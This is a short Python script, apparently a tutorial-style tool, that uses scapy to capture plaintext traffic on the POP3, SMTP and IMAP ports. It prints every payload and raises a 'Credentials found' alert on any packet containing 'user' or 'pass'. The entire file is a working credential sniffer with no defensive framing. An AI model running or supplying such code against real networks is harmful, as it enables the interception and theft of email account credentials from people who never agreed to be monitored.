from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        raw_payload = packet[TCP].payload
        payload_str = bytes(raw_payload).decode('utf-8', errors='ignore').lower()
        
        if len(payload_str) > 0:
             print(f"[DEBUG] Received data: {payload_str.strip()}")

        if 'user' in payload_str or 'pass' in payload_str:
            print(f"\n[!] ALERT: Credentials found!")
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] Payload: {payload_str.strip()}")

def main(): 
    print("[*] Starting sniffer on email ports...")
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
